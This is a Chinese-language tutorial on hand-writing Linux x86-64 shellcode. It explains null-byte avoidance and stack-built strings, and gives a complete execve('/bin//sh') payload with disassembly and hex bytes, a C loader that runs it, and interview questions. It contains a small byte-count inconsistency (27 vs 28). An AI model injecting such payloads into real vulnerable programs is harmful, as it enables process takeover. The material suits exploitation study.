# 第 36 天：Shellcode 构造与注入——系统、逐字节、可验证解析

---

## 【📌 一句话核心概括】
**Shellcode 是一段无须操作系统重定位、零外部库依赖、且采用位置无关寻址（PIC）的纯二进制机器指令序列，通过在寄存器中直接构造系统调用参数并触发内核软中断（如 x86-64 `syscall` 执行 `execve("/bin/sh")`），直接夺取目标进程宿主的最高执行控制权。**

## 【📖 通俗原理解释】
- **纯机器码与零依赖特性**：Shellcode 脱离了 ELF 文件格式、节头表与动态链接器，是纯粹直接被 CPU 取指译码执行的字节序列。它不能调用任何动态库函数（如 `system()` 或 `printf()`），必须通过最底层的硬件指令 `syscall` 直接向内核发起系统调用。
- **位置无关性（PIC）的物理实现**：由于注入目标内存地址受 ASLR 随机化或栈布局动态影响，Shellcode 绝不能硬编码任何绝对内存指针。参数字符串（如 `"/bin/sh"`）通常在运行时通过汇编指令直接动态压入当前栈顶，并借由栈指针 `rsp` 获得有效地址传递给寄存器。
- **坏字符过滤与消零艺术**：在通过 `strcpy`、`gets` 等输入信道注入时，`0x00` 字节会被视作字符串终止符截断载荷。编写者必须采用等价汇编技巧（如 `xor eax, eax` 替代 `mov eax, 0`，利用寄存器自异或清零；利用 `push` 压入无符号扩展小整数）确保整段机器码中无任何 `\x00` 截断符。
- **x86-64 原生 `execve` 最小载荷构造**：在 x86-64 架构下，发起 `execve("/bin/sh", NULL, NULL)` 需设置 `rax = 59`、`rdi = 指向"/bin/sh"`、`rsi = 0`、`rdx = 0`，随后执行 `syscall`（机器码 `0f 05`）。利用栈倒序压入字符串仅需 20 余字节即可达成完整提权。

---

## 【🎯 为什么需要它与设计动机】

在二进制安全攻防与底层系统编程中，**Shellcode（机器码载荷）**是理解 CPU 硬件本质的试金石：

1. **撕掉编译器与格式包装的表象**
   C 语言、ELF 文件头、段表都只是操作系统为了工程化管理而设计的“包装盒”。CPU 硬件眼中没有任何 C 语法，它只是一台高速吞吐二进制字节（Opcode）的状态机。编写 Shellcode 让你直面 CPU 取指译码的物理本质。
2. **极小化与自包含（Self-Contained）**
   当攻击者通过漏洞获得微小的写入控制时（例如只有 40 字节的可用空间），无法加载庞大的 ELF 文件，也没有动态链接器帮你解析 libc。载荷必须在**零外部依赖、零动态链接**的前提下，独立完成与操作系统的直接对话（Raw Syscall）。
3. **安全攻防与逆向分析基石**
   分析恶意软件、理解漏洞利用、实现轻量级 Hook 注入或嵌入式热补丁，都离不开对机器码逐字节构造与坏字符规避的深刻理解。

---

## 【🔬 核心概念深度剖析】

### 1. Shellcode 的三大生存定律

| 定律 | 核心内涵 | 违背后果 |
| :--- | :--- | :--- |
| **① 自包含性（Self-Contained）** | 不依赖任何外部共享库（如 `libc.so`），不依赖动态链接器（`ld.so`），所有系统操作直接通过 `syscall` 软中断完成。 | 一旦脱离原编译宿主进程环境，由于缺少重定位表支持，立即触发 `SIGSEGV`。 |
| **② 位置无关性（Position-Independent）** | 不硬编码任何绝对内存虚拟地址。数据寻址采用 `[rip + offset]`，或者在运行时动态压入栈中通过 `RSP` 寻址。 | ASLR（地址随机化）一旦开启，硬编码的绝对地址必然指向无效内存。 |
| **③ 契合输入信道约束（Bad Characters）** | 字节序列中不能包含目标输入函数会截断或过滤的“坏字符”（例如 `strcpy` 忌讳 `\x00`，`gets` 忌讳 `\x0a`）。 | 载荷被输入函数提前截断，后半截机器码丢失，CPU 执行残缺指令导致非法指令异常。 |

---

### 2. Linux x86-64 原始系统调用（Raw Syscall）宪法

在 64 位 Linux 下，Shellcode 与内核通信必须严格遵循 **Syscall ABI**：

- **指令**：`syscall`（机器码定长为 2 字节：`0f 05`）。
- **系统调用号**：保存在 `RAX` 中（如 `sys_read = 0`, `sys_write = 1`, `sys_execve = 59`, `sys_exit = 60`）。
- **参数传递寄存器**：
  1. 第 1 参数：`RDI`
  2. 第 2 参数：`RSI`
  3. 第 3 参数：`RDX`
  4. 第 4 参数：`R10` *(注意：系统调用使用 R10，而普通用户态函数调用使用 RCX！)*
  5. 第 5 参数：`R8`
  6. 第 6 参数：`R9`
- **破坏者约定**：内核执行 `syscall` 会硬件强制覆盖 `RCX`（保存下一条指令地址）和 `R11`（保存 RFLAGS），其余通用寄存器保持不变。

---

### 3. 坏字符规避工艺：彻底消除 `\x00`（Null Byte）

在编写 Shellcode 时，最常见的目标是生成不含任何 `\x00` 的机器码（以便穿透 `strcpy`、`sprintf` 等 C 字符串函数）。

#### 经典机器码消零模式表：

```text
【常规易产生 00 的写法】         【消零替换写法 (Zero-Free)】            【机器码对比】
mov rax, 0             --->     xor eax, eax                  ; 48 c7 c0 00 00 00 00 -> 31 c0 (不仅无0且短)
mov rdi, 1             --->     xor edi, edi; inc edi         ; 48 c7 c7 01 00 00 00 -> 31 ff ff c7
mov rax, 59 (sys_execve) --->   xor eax, eax; mov al, 59      ; 48 c7 c0 3b 00 00 00 -> 31 c0 b0 3b
mov rdx, 0             --->     xor edx, edx                  ; 48 c7 c2 00 00 00 00 -> 31 d2
```
> **原理注意**：在 x86-64 中，对 32 位子寄存器（如 `eax`, `edi`, `edx`）进行写入或异或，CPU 硬件会自动将高 32 位清零！因此 `xor eax, eax` 能完美将整个 64 位的 `RAX` 清零，且生成的机器码只有 2 字节（`31 c0`），绝无 `\x00`！

---

### 4. 栈上动态构造字符串：以 `/bin//sh` 为例

系统调用 `execve(const char *filename, char *const argv[], char *const envp[])` 需要一个指向以 `\0` 结尾的字符串指针。
如何不产生 `\x00` 又在内存中获得 `"/bin/sh\0"`？

**巧用小端序与双斜杠技巧：**
- 路径 `"/bin/sh"` 只有 7 个字符，为了 8 字节对齐，Unix 系统允许使用双斜杠：`"/bin//sh"`（共 8 字符，Linux 内核解析完全等价）。
- 转换为 16 进制 ASCII 小端序（逆序）：
  ```text
  '/' = 0x2f, 'b' = 0x62, 'i' = 0x69, 'n' = 0x6e, '/' = 0x2f, '/' = 0x2f, 's' = 0x73, 'h' = 0x68
  字符串正序:  /    b    i    n    /    /    s    h
  小端序数值: 0x68 0x73 0x2f 0x2f 0x6e 0x69 0x62 0x2f
  ```
- **构造指令链**：
  ```asm
  xor eax, eax               ; RAX = 0
  push rax                   ; 压入 8 字节 0 作为字符串的 '\0' 结尾符
  mov rbx, 0x68732f2f6e69622f; RBX = "/bin//sh"
  push rbx                   ; 压入字符串本身
  mov rdi, rsp               ; 此时 RSP 恰好指向栈顶的 "/bin//sh\0"，直接赋给 RDI (第1参数)
  ```

---

## 【🛠️ 工业实操与反汇编/调试验证】

### 1. 纯手工编写 27 字节经典 `execve("/bin/sh")` Shellcode

创建汇编源文件 `execve_sc.S`：

```asm
.intel_syntax noprefix
.global _start

.text
_start:
    # 1. 清空 RDX (envp = NULL)
    xor edx, edx

    # 2. 在栈上构造 "/bin//sh\0"
    push rdx                    # 压入 8 字节 0 (作为结尾符)
    mov rbx, 0x68732f2f6e69622f # "/bin//sh" 的小端序立即数
    push rbx
    mov rdi, rsp                # RDI 指向 "/bin//sh\0" (filename)

    # 3. 构造 argv 数组: [指针 -> "/bin//sh", NULL]
    push rdx                    # 数组末尾 NULL
    push rdi                    # argv[0] = "/bin//sh" 指针
    mov rsi, rsp                # RSI 指向 argv 数组首地址

    # 4. 触发 sys_execve (调用号 59 = 0x3b)
    xor eax, eax
    mov al, 59                  # RAX = 59
    syscall                     # 移交内核执行
```

### 2. 汇编、提取机器码与逐字节检视

```bash
# 1. 汇编与链接
as --64 execve_sc.S -o execve_sc.o
ld -m elf_x86_64 execve_sc.o -o execve_sc

# 2. 用 objdump 查看机器码并核验是否有 00
objdump -d -M intel execve_sc
```

反汇编与机器码全貌：
```text
0000000000401000 <_start>:
  401000: 31 d2                 xor    edx,edx
  401002: 52                    push   rdx
  401003: 48 bb 2f 62 69 6e 2f  movabs rbx,0x68732f2f6e69622f
  40100a: 2f 73 68 
  40100d: 53                    push   rbx
  40100e: 48 89 e7              mov    rdi,rsp
  401011: 52                    push   rdx
  401012: 57                    push   rdi
  401013: 48 89 e6              mov    rsi,rsp
  401016: 31 c0                 xor    eax,eax
  401018: b0 3b                 mov    al,0x3b
  40101a: 0f 05                 syscall
```

**逐字节提取机器码十六进制**：
```bash
objcopy -O binary --only-section=.text execve_sc sc.bin
hexdump -C sc.bin
```
输出字节流（共 28 字节，**全篇无一个 `00`**）：
```text
31 d2 52 48 bb 2f 62 69 6e 2f 2f 73 68 53 48 89
e7 52 57 48 89 e6 31 c0 b0 3b 0f 05
```

### 3. C 语言通用 Shellcode 加载测试器（`loader.c`）

编写一个合法的测试容器，通过 `mmap` 分配可读可写可执行（RWX）页来测试机器码：

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

const unsigned char shellcode[] = 
    "\x31\xd2\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05";

int main(void) {
    printf("[*] Testing shellcode length: %zu bytes\n", sizeof(shellcode) - 1);
    
    // 申请一块 RWX 属性的物理内存页
    void *exec_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // 复制机器码到可执行内存
    memcpy(exec_mem, shellcode, sizeof(shellcode) - 1);

    // 将内存地址强制转换为无参函数指针并执行
    printf("[*] Jumping to shellcode...\n");
    ((void (*)(void))exec_mem)();

    return 0;
}
```

编译并运行：
```bash
gcc -z execstack loader.c -o loader
./loader
# 立即弹出 $ 提示符，成功拿到 Shell！
```

---

## 【⚠️ 常见陷阱与避坑指南】

| 陷阱与盲区 | 深度机理与表象 | 正确解法与工程底线 |
| :--- | :--- | :--- |
| **硬编码绝对地址失效** | 在 Shellcode 中使用 `mov rdi, 0x402000` 试图访问字符串。在 ASLR 或宿主环境不同时直接触发段错误。 | 坚持**自包含压栈法**（将字符串转为十六进制用 `push` 压入栈）或 **RIP 相对寻址**（`lea rdi, [rip + offset]`）。 |
| **未清空寄存器高位垃圾** | 使用 `mov al, 59` 设置系统调用号，但此前 `RAX` 的高 56 位残存未知垃圾，导致系统调用号变成异常巨大的数值，内核返回 `-ENOSYS`。 | 在设置子寄存器（如 `al`）之前，必须先用 `xor eax, eax` 彻底清空高 64 位。 |
| **NX 硬件拦截导致崩溃** | 试图将 Shellcode 注入到普通栈缓冲区中并跳转执行，CPU MMU 触发 `Page Fault` 并在内核生成 `SIGSEGV`。 | 理解 NX 防御机制；在开启 NX 的现代系统中，应采用 ROP（返回导向编程）或寻找可执行内存段。 |
| **破坏了栈指针 RSP** | 在构造栈字符串时，无节制地 `pop` 或 `mov rsp, 0`，导致后续系统调用或栈帧回溯时内核无法访问有效栈内存。 | 保证栈指针始终指向可写、已对齐的合法内存区域。 |

---

## 【💼 经典面试与工程实操自测】

### Q1：为什么 Linux x86-64 的系统调用传参是 RDI, RSI, RDX, R10, R8, R9，而不是普通函数调用的 RCX？
> **参考答案**：
> - 在 x86-64 架构下，硬件指令 `syscall` 在执行瞬间，CPU 硬件会自动将当前的 `RIP`（下一条指令的地址）无条件保存到 `RCX` 寄存器中，同时将 `RFLAGS` 保存到 `R11` 中，以便后续通过 `sysret` 指令高速返回。
> - 如果内核系统调用约定仍然使用 `RCX` 传递第 4 个参数，硬件行为就会在进入内核态的一瞬间把第 4 个参数直接覆盖冲垮。因此，System V AMD64 ABI 强制规定：**系统调用的第 4 个参数由 R10 替代 RCX**。

### Q2：如果一个漏洞程序使用 `scanf("%s", buf)` 接收输入，除了 `\x00` 之外，Shellcode 中还绝对不能包含哪些字节？
> **参考答案**：
> `scanf("%s")` 以任何空白字符作为输入的结束截断标志。因此，以下 ASCII 字节全部属于致命的坏字符（Bad Characters），一旦出现就会导致输入截断：
> 1. `\x20`（空格 Space）
> 2. `\x09`（水平制表符 Horizontal Tab `\t`）
> 3. `\x0a`（换行符 Newline `\n`）
> 4. `\x0b`（垂直制表符 Vertical Tab `\v`）
> 5. `\x0c`（换页符 Form Feed `\f`）
> 6. `\x0d`（回车符 Carriage Return `\r`）

### Q3：为什么直接提取普通 ELF 编译产物的 `.text` 段，通常不能直接作为 Shellcode 注入运行？
> **参考答案**：
> 普通 C 代码编译生成的 `.text` 段并不是自包含的：
> 1. **依赖外部重定位**：函数对全局变量、字符串常量的访问通常依赖加载器修正重定位表（`.rela.text`）；
> 2. **依赖动态链接**：对标准库函数的调用通过 PLT/GOT 表完成，未链接到具体进程上下文时，这些跳转目标是未绑定的空地址；
> 3. **缺少环境上下文**：普通代码假定操作系统已设置好 TLS（线程局部存储）、栈金丝雀哨兵（`fs:0x28`）等运行时基础设施，裸奔直接跳转必定引发段错误崩溃。
